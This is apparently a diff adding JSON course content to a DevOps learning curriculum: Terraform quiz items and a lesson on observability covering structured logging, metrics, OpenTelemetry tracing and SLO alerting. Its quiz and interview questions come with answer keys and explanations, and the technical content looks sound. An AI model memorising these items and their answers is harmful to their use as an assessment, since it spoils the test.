+          "explanation": "Remote backends with locking (S3 lockfile, DynamoDB, HCP Terraform) ensure only one operation modifies state at a time."
+        },
+        {
+          "id": "devops-cloud-08-q03",
+          "type": "mcq",
+          "prompt": "A plan shows `-/+ resource \"aws_db_instance\" \"main\" (must be replaced)`. What should you do?",
+          "options": [
+            "Apply immediately, replacements are harmless",
+            "Stop and investigate: replacing a database destroys it and its data unless handled",
+            "Run terraform fmt",
+            "Delete the state file"
+          ],
+          "answer": 1,
+          "explanation": "A forced replacement of a stateful resource means destroy and recreate. Find the attribute causing it, and protect such resources with prevent_destroy."
+        },
+        {
+          "id": "devops-cloud-08-q04",
+          "type": "mcq",
+          "prompt": "Given `count = length(var.names)` with names [\"a\", \"b\", \"c\"], you remove \"a\". What happens?",
+          "options": [
+            "Only resource a is destroyed",
+            "Indexes shift, so b and c are seen as changed/replaced and the last index is destroyed",
+            "Nothing changes",
+            "Terraform errors out"
+          ],
+          "answer": 1,
+          "explanation": "count addresses by index: [0]=a,[1]=b,[2]=c becomes [0]=b,[1]=c. Terraform updates or replaces [0] and [1] and destroys [2]. `for_each` with keys avoids this."
+        },
+        {
+          "id": "devops-cloud-08-q05",
+          "type": "mcq",
+          "prompt": "Where should Terraform state for a team project be stored?",
+          "options": [
+            "Committed to the Git repo",
+            "On the lead engineer's laptop",
+            "In a remote backend with encryption, versioning and locking",
+            "In a public S3 bucket for easy access"
+          ],
+          "answer": 2,
+          "explanation": "State can contain secrets and must be shared safely. Remote encrypted, versioned, locked storage is the standard."
+        },
+        {
+          "id": "devops-cloud-08-q06",
+          "type": "mcq",
+          "prompt": "Someone changed a security group manually in the AWS console. What is this called and how do you see it?",
+          "options": [
+            "Drift; visible in `terraform plan`",
+            "Taint; visible in `terraform fmt`",
+            "Import; visible in `terraform init`",
+            "Output; visible in `terraform output`"
+          ],
+          "answer": 0,
+          "explanation": "Plan refreshes real state and shows differences from configuration. Apply will revert the manual change unless you codify it."
+        },
+        {
+          "id": "devops-cloud-08-q07",
+          "type": "truefalse",
+          "prompt": "Marking a variable `sensitive = true` keeps its value out of the state file.",
+          "answer": false,
+          "explanation": "It only redacts the value in CLI output. The value is still stored in state in plain text, which is why state must be protected."
+        },
+        {
+          "id": "devops-cloud-08-q08",
+          "type": "truefalse",
+          "prompt": "OpenTofu is an open-source fork of Terraform that is largely compatible with Terraform configurations.",
+          "answer": true,
+          "explanation": "OpenTofu forked after HashiCorp moved Terraform to the BSL license in 2023 and is maintained under the Linux Foundation."
+        },
+        {
+          "id": "devops-cloud-08-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which belong in a Terraform pull request pipeline?",
+          "options": [
+            "terraform fmt -check",
+            "terraform validate",
+            "terraform plan posted to the PR",
+            "terraform destroy",
+            "Static security scanning (Checkov/tfsec/Trivy)"
+          ],
+          "answers": [
+            0,
+            1,
+            2,
+            4
+          ],
+          "explanation": "PR checks verify formatting, validity, security and show the plan for review. Destroy has no place in a PR pipeline."
+        },
+        {
+          "id": "devops-cloud-08-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: To stop Terraform from ever deleting a resource, set `lifecycle { ___ = true }`.",
+          "accept": [
+            "prevent_destroy"
+          ],
+          "explanation": "prevent_destroy makes any plan that would destroy the resource fail with an error."
+        },
+        {
+          "id": "devops-cloud-08-q11",
+          "type": "interview",
+          "prompt": "How would you structure Terraform for a company with dev, staging and production on AWS?",
+          "answer": "- Separate AWS accounts per environment (via AWS Organizations) for blast-radius and IAM isolation.\n- Reusable internal modules (network, ecs-service, rds, monitoring) with versioned releases.\n- Per-environment root configurations (`live/prod/network`, `live/prod/app`...) calling modules with env-specific variables, each with its own remote state and lock; split by component so a change to the app does not plan the whole VPC.\n- Pass values between stacks via outputs and `terraform_remote_state` or SSM parameters.\n- CI: fmt, validate, tflint, Checkov, plan on PR with plan comment; apply saved plan on merge via OIDC role per account, production gated by approval.\n- Guardrails: prevent_destroy on data stores, scheduled drift detection, policy as code (OPA/Sentinel) for things like 'no public S3 buckets'.",
+          "level": "advanced"
+        },
+        {
+          "id": "devops-cloud-08-q12",
+          "type": "interview",
+          "prompt": "You need to bring a manually created RDS instance under Terraform management. How?",
+          "answer": "- Write the matching `aws_db_instance` resource in code.\n- Use an `import` block (`import { to = aws_db_instance.main  id = \"mydb\" }`) and run plan; newer Terraform can even generate config with `terraform plan -generate-config-out=generated.tf`. The older CLI `terraform import` also works.\n- Iterate until plan shows no changes, meaning code matches reality; do not apply while it shows a replacement.\n- Add `lifecycle { prevent_destroy = true }` and possibly `ignore_changes` for attributes changed by operations (like minor engine version with auto-upgrade).\n- Move secrets (master password) to Secrets Manager / `manage_master_user_password` rather than plain variables.",
+          "level": "advanced"
+        },
+        {
+          "id": "devops-cloud-08-q13",
+          "type": "interview",
+          "prompt": "Compare Terraform with AWS CDK or Pulumi. When would you pick each?",
+          "answer": "- Terraform/OpenTofu: declarative HCL, huge provider ecosystem (AWS, Cloudflare, Datadog, GitHub, Vercel), mature tooling for plans, policy and drift. Best for multi-cloud or multi-vendor infrastructure and platform teams.\n- AWS CDK: TypeScript/Python constructs synthesizing CloudFormation; AWS-native with high-level constructs and CloudFormation's managed state and rollbacks. Good for AWS-only teams who want to stay in TypeScript, and app teams deploying serverless stacks.\n- Pulumi: general-purpose languages over its own engine and multi-cloud providers; strong for teams wanting loops, abstractions and testing in real code.\n- Trade-offs: real languages allow powerful abstractions but also complexity and non-determinism; HCL is constrained but readable to ops. Choose based on team skills, cloud footprint and existing ecosystem.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "Terraform documentation",
+          "url": "https://developer.hashicorp.com/terraform/docs"
+        },
+        {
+          "title": "Terraform S3 backend",
+          "url": "https://developer.hashicorp.com/terraform/language/backend/s3"
+        },
+        {
+          "title": "OpenTofu documentation",
+          "url": "https://opentofu.org/docs/"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-09-observability",
+      "title": "Observability: Logs, Metrics, Traces and SLOs",
+      "level": "advanced",
+      "summary": "Instrument services with structured logs, metrics and distributed traces using OpenTelemetry, and alert on SLOs instead of noise.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "Monitoring vs observability",
+          "body": "**Monitoring** answers known questions: is CPU high, is the site up, is the error rate above 1%? **Observability** is the ability to answer new questions about system behavior from the telemetry it emits, without shipping new code, such as \"why are checkout requests from Android users in Germany slow since 14:00?\"\n\nThe three main signals:\n\n- **Logs**: timestamped events with context. Great detail, expensive at volume.\n- **Metrics**: numeric aggregates over time (counters, gauges, histograms). Cheap to store and ideal for dashboards and alerts.\n- **Traces**: the path of one request across services as a tree of **spans**, each with timing and attributes. Ideal for latency and dependency analysis.\n\nProfiles (continuous profiling) are increasingly treated as a fourth signal. The power comes from correlating them: a metric spike links to example traces, and traces link to the logs of each span via a shared `trace_id`."
+        },
+        {
+          "heading": "Structured logging",
+          "body": "Log JSON, not free text, so log platforms can filter and aggregate by field. Include a timestamp, level, message, service name, environment, request or trace ID, and relevant business IDs (userId, orderId).\n\n- Use a fast logger like **pino** in Node; write to stdout (12-factor) and let the platform ship logs (CloudWatch, Loki, Datadog, Elastic).\n- Use levels deliberately: `error` for actionable failures, `warn` for degraded behavior, `info` for business events, `debug` off in production by default.\n- **Never log secrets or sensitive personal data**: passwords, tokens, full card numbers. Use the logger's redaction feature.\n- Log volume costs money; sample noisy success logs and rely on metrics for counts.",
+          "code": {
+            "lang": "typescript",
+            "source": "import pino from \"pino\";\n\nexport const logger = pino({\n  level: process.env.LOG_LEVEL ?? \"info\",\n  base: { service: \"orders-api\", env: process.env.NODE_ENV },\n  redact: [\"req.headers.authorization\", \"password\", \"card.number\"],\n});\n\n// child logger carries request context on every line\nconst log = logger.child({ requestId: req.id, userId: user.id });\nlog.info({ orderId, totalCents }, \"order placed\");\nlog.error({ err, orderId }, \"payment capture failed\");"
+          }
+        },
+        {
+          "heading": "Metrics: RED, USE and the four golden signals",
+          "body": "Metric types: **counter** (only goes up: requests_total), **gauge** (goes up and down: memory, queue depth), **histogram** (distribution of values in buckets: request duration), which lets you compute percentiles.\n\nUseful frameworks:\n\n- **RED** for services: Rate (requests/s), Errors (failed/s), Duration (latency distribution).\n- **USE** for resources: Utilization, Saturation, Errors (CPU, disk, connection pools).\n- Google SRE's **four golden signals**: latency, traffic, errors, saturation.\n\nWatch percentiles, not averages: p50 can look fine while p99 users wait 8 seconds. Also beware **high cardinality** labels: adding `userId` or a full URL as a metric label creates millions of time series and can take down Prometheus or explode your bill. Put high-cardinality data in traces and logs instead.\n\nPrometheus scrapes metrics from a `/metrics` endpoint and is queried with PromQL; Grafana is the common dashboarding layer. Managed alternatives include CloudWatch, Datadog and Grafana Cloud."
+        },
+        {
+          "heading": "Distributed tracing with OpenTelemetry",
+          "body": "**OpenTelemetry (OTel)** is the CNCF standard for generating and exporting telemetry: vendor-neutral APIs and SDKs, auto-instrumentation libraries (HTTP, Express, pg, Redis, fetch), the **OTLP** protocol, and the **Collector** which receives, processes (batching, sampling, redaction) and exports to any backend (Jaeger, Tempo, Honeycomb, Datadog, X-Ray).\n\nTrace context propagates between services through the W3C `traceparent` HTTP header, so a trace can follow a request from the browser through the API gateway, services, queues and the database.\n\n**Sampling** controls cost: head sampling decides at the start (keep 10%), tail sampling (in the Collector) decides after the trace completes, so you can keep all errors and slow traces while dropping most healthy ones.\n\nIn Next.js, `instrumentation.ts` with `@vercel/otel` or the OTel Node SDK registers tracing at startup.",
+          "code": {
+            "lang": "typescript",
+            "source": "// tracing.ts - load before the app: node --import ./tracing.js server.js\nimport { NodeSDK } from \"@opentelemetry/sdk-node\";\nimport { getNodeAutoInstrumentations } from \"@opentelemetry/auto-instrumentations-node\";\nimport { OTLPTraceExporter } from \"@opentelemetry/exporter-trace-otlp-http\";\n\nconst sdk = new NodeSDK({\n  serviceName: \"orders-api\",\n  traceExporter: new OTLPTraceExporter({ url: \"http://otel-collector:4318/v1/traces\" }),\n  instrumentations: [getNodeAutoInstrumentations()],\n});\nsdk.start();\n\n// manual span around business logic\nimport { trace } from \"@opentelemetry/api\";\nconst tracer = trace.getTracer(\"orders\");\nawait tracer.startActiveSpan(\"chargeCard\", async (span) => {\n  span.setAttribute(\"order.id\", orderId);\n  try { await payments.charge(orderId); }\n  catch (e) { span.recordException(e as Error); throw e; }\n  finally { span.end(); }\n});"
+          }
+        },
+        {
+          "heading": "SLIs, SLOs, error budgets and alerting",
+          "body": "An **SLI** (indicator) measures user experience, for example the proportion of requests served successfully in under 300 ms. An **SLO** (objective) is the target: 99.9% over 30 days. An **SLA** is a contractual promise with penalties, usually looser than the SLO.\n\nThe **error budget** is `1 - SLO`: 99.9% over 30 days allows about 43 minutes of badness. If the budget is healthy, ship faster; if it is burning, prioritize reliability work.\n\nAlerting principles:\n\n- Alert on **symptoms users feel** (SLO burn rate, error rate, latency), not on every cause (CPU at 80%).\n- Use **multi-window burn-rate alerts**: page when the budget burns fast (for example 14x over 1 hour), ticket when it burns slowly.\n- Every page must be actionable and link to a runbook; noisy alerts cause alert fatigue and missed incidents.\n- After incidents, run **blameless postmortems** focused on systemic fixes."
+        }
+      ],
+      "keyPoints": [
+        "Logs, metrics and traces answer different questions; correlate them through a shared trace ID.",
+        "Log structured JSON to stdout with context IDs, and redact secrets and personal data.",
+        "Use RED for services and USE for resources; watch p95/p99, not averages.",
+        "Avoid high-cardinality metric labels like user IDs; put that detail in traces and logs.",
+        "OpenTelemetry is the vendor-neutral standard: SDK + auto-instrumentation + OTLP + Collector.",
+        "Trace context propagates via the W3C `traceparent` header; tail sampling keeps errors and slow traces.",
+        "Define SLOs and error budgets; alert on burn rate and user-facing symptoms, with runbooks."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-09-q01",
+          "type": "mcq",
+          "prompt": "Which signal is best for finding which downstream service made one specific request slow?",
+          "options": [
+            "CPU metrics",
+            "A distributed trace",
+            "Disk usage gauge",
+            "Uptime check"
+          ],
+          "answer": 1,
+          "explanation": "A trace shows each span's timing across services, so you can see exactly which call consumed the latency."
+        },
+        {
+          "id": "devops-cloud-09-q02",
+          "type": "mcq",
+          "prompt": "An engineer adds a `user_id` label to the `http_requests_total` Prometheus metric for a 5 million user app. What is the problem?",
+          "options": [
+            "Counters cannot have labels",
+            "It creates millions of time series (high cardinality), exploding memory and cost",
+            "Prometheus does not support strings",
+            "Nothing, it is best practice"
+          ],
+          "answer": 1,
+          "explanation": "Each unique label combination is a separate series. Unbounded labels like user IDs belong in traces or logs."
+        },
+        {
+          "id": "devops-cloud-09-q03",
+          "type": "mcq",
+          "prompt": "Average latency is 120 ms but users complain about slowness. What should you look at?",
+          "options": [
+            "Minimum latency",
+            "Tail percentiles like p95 and p99",
+            "Total request count only",
+            "CPU temperature"
+          ],
+          "answer": 1,
+          "explanation": "Averages hide the tail. A small slow fraction can be invisible in the mean but painful for many users (and every user over many requests)."
+        },
+        {
+          "id": "devops-cloud-09-q04",
+          "type": "mcq",
+          "prompt": "An SLO is 99.9% availability over 30 days. Roughly how much full downtime does the error budget allow?",
+          "options": [
+            "About 4.3 minutes",
+            "About 43 minutes",
+            "About 7.2 hours",
+            "About 3.6 days"
+          ],
+          "answer": 1,
+          "explanation": "0.1% of 30 days = 0.001 x 43,200 minutes = 43.2 minutes."
+        },
+        {
+          "id": "devops-cloud-09-q05",
+          "type": "mcq",
+          "prompt": "How is trace context passed from one service to another over HTTP in OpenTelemetry by default?",
+          "options": [
+            "A cookie named trace",
+            "The W3C `traceparent` header",
+            "The URL query string",
+            "It is not propagated"
+          ],
+          "answer": 1,
+          "explanation": "OTel uses W3C Trace Context by default: `traceparent` carries trace ID, parent span ID and flags."
+        },
+        {
+          "id": "devops-cloud-09-q06",
+          "type": "mcq",
+          "prompt": "Which alert is most aligned with SRE best practice?",
+          "options": [
+            "Page when CPU > 70% on any node",
+            "Page when the checkout SLO error budget is burning at 14x the sustainable rate over the last hour",
+            "Page on every single 500 response",
+            "Email when a deploy succeeds"
+          ],
+          "answer": 1,
+          "explanation": "Burn-rate alerts tie paging to user impact and urgency. Cause-based thresholds (CPU) are noisy and often not actionable."
+        },
+        {
+          "id": "devops-cloud-09-q07",
+          "type": "truefalse",
+          "prompt": "Tail sampling can keep 100% of error traces while discarding most successful ones.",
+          "answer": true,
+          "explanation": "Tail sampling decides after the trace is complete (usually in the OTel Collector), so it can filter by status and latency."
+        },
+        {
+          "id": "devops-cloud-09-q08",
+          "type": "truefalse",
+          "prompt": "Logging full request bodies, including passwords and tokens, is fine as long as logs are stored privately.",
+          "answer": false,
+          "explanation": "Logs are widely accessible, replicated and retained; secrets in logs are a common breach source and a compliance violation. Redact them."
+        },
+        {
+          "id": "devops-cloud-09-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are components or features of OpenTelemetry?",
+          "options": [
+            "Language SDKs and APIs",
+            "The OTLP protocol",
+            "The Collector",
+            "A built-in hosted dashboard UI",
+            "Auto-instrumentation libraries"
+          ],
+          "answers": [
+            0,
+            1,
+            2,
+            4
+          ],
+          "explanation": "OTel generates, processes and exports telemetry. Storage and visualization come from backends like Jaeger, Tempo, Grafana or vendors."
+        },
+        {
+          "id": "devops-cloud-09-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: The service-level metrics framework of Rate, Errors and Duration is abbreviated ___.",
+          "accept": [
+            "RED",
+            "R.E.D."
+          ],
+          "explanation": "RED (Tom Wilkie) covers request-driven services; USE (Brendan Gregg) covers resources."
+        },
+        {
+          "id": "devops-cloud-09-q11",
+          "type": "interview",
+          "prompt": "How would you add observability to an existing Node.js microservices system with none today?",
+          "answer": "- Start with structured JSON logs (pino) to stdout with request IDs, shipped to a central store.\n- Add OpenTelemetry SDK with auto-instrumentation in every service (HTTP, Express/Fastify, pg, Redis, fetch, messaging), exporting OTLP to an OTel Collector; the Collector batches, samples (tail sampling keeping errors and slow traces) and exports to the chosen backend.\n- Inject trace_id into logs to correlate; propagate context through queues by putting `traceparent` in message headers.\n- Emit RED metrics per endpoint (histograms) and USE metrics for pools and queues; build dashboards per service.\n- Define SLOs for key user journeys (login, checkout) and set burn-rate alerts with runbooks.\n- Roll out incrementally starting at the edge (gateway) and highest-traffic services, and control cost via sampling and label hygiene.",
+          "level": "advanced"
+        },
+        {
+          "id": "devops-cloud-09-q12",
+          "type": "interview",
+          "prompt": "p99 latency of an API doubled after a deploy, but p50 is unchanged. How do you investigate?",
+          "answer": "- Confirm correlation with the deploy (deploy markers on dashboards) and consider rolling back first if the SLO is burning.\n- Break down latency by endpoint, region, instance and version to see whether it is isolated (canary vs baseline).\n- Pull exemplar traces from the slow tail: which span grew? Common culprits are a new N+1 query, a missing index, a synchronous external call, lock contention, or a connection pool exhausted under load.\n- Check saturation metrics: DB pool wait time, event loop lag in Node (GC pauses or CPU-heavy work blocking the loop), CPU throttling from container limits.\n- Compare profiles before/after if continuous profiling exists.\n- Fix, add a regression test or performance check, and document in a postmortem.",
+          "level": "advanced"
+        },
+        {
+          "id": "devops-cloud-09-q13",
+          "type": "interview",
+          "prompt": "Explain SLI, SLO, SLA and error budgets, and how they change engineering decisions.",
+          "answer": "- SLI: a measured ratio of good events to total, for example successful requests under 300 ms / all requests.\n- SLO: the internal target for that SLI over a window, for example 99.9% per 28 days.\n- SLA: an external contract with consequences, set looser than the SLO so you breach the SLO first.\n- Error budget: 1 - SLO, the amount of unreliability you can spend.\n- Decisions: when budget remains, teams ship features and take risks (faster deploys, experiments); when it is exhausted, a freeze or reliability focus kicks in. It turns the 'velocity vs stability' argument into data both product and engineering agreed to, and drives alerting via burn rates instead of arbitrary thresholds.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OpenTelemetry documentation",
+          "url": "https://opentelemetry.io/docs/"
+        },
+        {
+          "title": "Google SRE Book - Service Level Objectives",
+          "url": "https://sre.google/sre-book/service-level-objectives/"
+        },
+        {
+          "title": "Prometheus - Metric and label naming",
+          "url": "https://prometheus.io/docs/practices/naming/"
+        }
+      ]
+    }
+  ]
+}
